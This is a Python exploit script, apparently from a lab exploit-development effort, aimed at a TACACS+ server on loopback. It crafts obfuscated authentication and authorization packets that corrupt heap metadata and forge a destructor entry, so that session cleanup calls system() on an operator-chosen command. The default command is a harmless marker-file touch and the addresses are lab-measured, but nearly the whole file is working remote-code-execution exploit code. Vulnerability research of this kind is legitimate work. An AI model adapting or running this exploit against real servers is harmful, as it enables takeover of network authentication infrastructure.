#!/usr/bin/env python3
"""W129 rung-5 attempt: write-what-where -> fake mem_t destructor entry.

Uses the W129 `t`-slot redirect to write a contiguous blob into session->mem:
  m+12: arr_count = 1, arr = m+48, with the adjacent malloc chunk header and
  memlist neutralised so the write stays inside live heap metadata
  m+48: {f = system, p = command string in the prime}
cleanup_session() then calls mem_destroy(session->mem), which invokes
m->arr[0].f(m->arr[0].p) == system("<lab-chosen benign command>").
All addresses are lab-measured under gdb (ASLR disabled); no off-loopback
traffic.  This is an experiment, not an admission of rung 5.
"""
import argparse
import hashlib
import socket
import struct


def pad(sid, key, version, seq, prev=b""):
    return hashlib.md5(sid + key + bytes([version, seq]) + prev).digest()


def obf(body, sid, key, version, seq):
    p = pad(sid, key, version, seq)
    out = bytearray()
    for i in range(0, len(body), 16):
        c = body[i:i + 16]
        out.extend(a ^ b for a, b in zip(c, p))
        p = pad(sid, key, version, seq, p)
    return bytes(out)


def wire_hdr(ptype, seq, sid, body, key, version=0xC0, flags=0):
    e = obf(body, sid, key, version, seq)
    hdr = struct.pack("!BBBBI", version, ptype, seq, flags, int.from_bytes(sid, "big"))
    hdr += struct.pack("!I", len(body))
    return hdr + e


def authen_start(sid, key, user, version=0xC0):
    u = user.encode()
    return wire_hdr(1, 1, sid, bytes([1, 0, 1, 1, len(u), 0, 0, 0]) + u, key, version)


def authen_cont_prime(sid, key, seq, body_len, pattern_body_off, pattern, version=0xC0):
    data_len = body_len - 5
    fixed = struct.pack("!HHB", 0, data_len, 0)
    data = bytearray(b"P" * data_len)
    off = pattern_body_off - 5
    data[off:off + len(pattern)] = pattern
    return wire_hdr(1, seq, sid, fixed + bytes(data), key, version)


def author_trigger(sid, key, seq, table, data, version=0xC0):
    fixed = bytes([6, 1, 1, 1, 0, 0, 0, len(table)])
    return wire_hdr(2, seq, sid, fixed + bytes(table) + data, key, version)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=4990)
    ap.add_argument("--key", default="demo")
    ap.add_argument("--trigger-sid", default="aabbccdd")
    ap.add_argument("--user", default="demo")
    ap.add_argument("--mem-addr", default="0x5555555fd680")
    ap.add_argument("--system-addr", default="0x7ffff7c58750")
    ap.add_argument("--in-addr", default="0x5555555fdad0")
    ap.add_argument("--cmd-off", type=int, default=1900)
    ap.add_argument("--cmd", default="touch /tmp/tacplus-w129-marker")
    ap.add_argument("--prime-len", type=int, default=2000)
    ap.add_argument("--pattern-off", type=int, default=1112)
    ap.add_argument("--no-prime", action="store_true")
    ap.add_argument("--data",
                    default="cmd=AAAAcmd=BBBBcmd=CCCCcmd=DDDDcmd=EEEEcmd=FFFFcmd=GGGGcmd=HHHH")
    ap.add_argument("--timeout", type=float, default=3.0)
    # Accepted and ignored: run_gdb2.py always passes these.
    ap.add_argument("--arg0", type=int, default=8)
    ap.add_argument("--rest", type=int, default=19)
    ap.add_argument("--rest-byte", type=int, default=8)
    a = ap.parse_args()

    sid = bytes.fromhex("11223344")
    key = a.key.encode()
    mem = int(a.mem_addr, 16)
    in_addr = int(a.in_addr, 16)
    system = int(a.system_addr, 16)
    target = mem + 12
    cmd_addr = in_addr + a.cmd_off
    transit = bytearray(b"F" * 136)
    transit[104:112] = target.to_bytes(8, "little")
    transit[128:136] = (12).to_bytes(8, "little")

    fake_arr = mem + 48

    # One contiguous write from m+12 to m+63.  Preserve the malloc chunk
    # header at m+24 and neutralise the adjacent memlist (arr_count=0) so
    # memlist_destroy() stays clean; place the fake destructor entry at m+48.
    blob = (struct.pack("<I", 1) +
            struct.pack("<Q", fake_arr) +
            struct.pack("<Q", 0x21) +
            struct.pack("<Q", 0) +
            struct.pack("<Q", 0) +
            struct.pack("<Q", system) +
            struct.pack("<Q", cmd_addr))

    pattern = bytearray()
    pattern += b"cmd=" + bytes(transit)
    pattern += b"cmd=" + (target - 8).to_bytes(8, "little")
    pattern += b"cmd=" + blob + b"\x00"
    # cmd string lands at in_addr + cmd_off; pattern starts at in_addr + 1156.
    cmd_pattern_off = a.cmd_off - 1156
    if cmd_pattern_off < len(pattern):
        raise SystemExit("cmd offset overlaps the redirect records")
    pattern += b"X" * (cmd_pattern_off - len(pattern))
    pattern += a.cmd.encode() + b"\x00"
    pattern += b"X" * (850 - len(pattern))

    table = [8] * 20
    for si, val in ((8, 255), (9, 255), (10, 255), (11, 255),
                    (12, 140), (13, 12), (14, 5 + len(blob))):
        table[si] = val
    for si in range(15, 20):
        table[si] = 0

    s = socket.create_connection(("127.0.0.1", a.port), timeout=a.timeout)
    s.settimeout(a.timeout)

    if not a.no_prime:
        p1 = authen_start(sid, key, a.user)
        s.sendall(p1)
        try:
            s.recv(65536)
        except socket.timeout:
            pass
        p2 = authen_cont_prime(sid, key, 3, a.prime_len, a.pattern_off, bytes(pattern))
        s.sendall(p2)
        try:
            s.recv(65536)
        except socket.timeout:
            pass

    p3 = author_trigger(bytes.fromhex(a.trigger_sid), key, 1, table, a.data.encode())
    s.sendall(p3)
    try:
        r3 = s.recv(65536)
    except socket.timeout:
        r3 = b""
    print(f"trigger reply_len={len(r3)} reply={r3[:64].hex()}")
    print(f"target=0x{target:x} system=0x{system:x} cmd_addr=0x{cmd_addr:x} "
          f"cmd={a.cmd!r}")
    s.close()


if __name__ == "__main__":
    main()
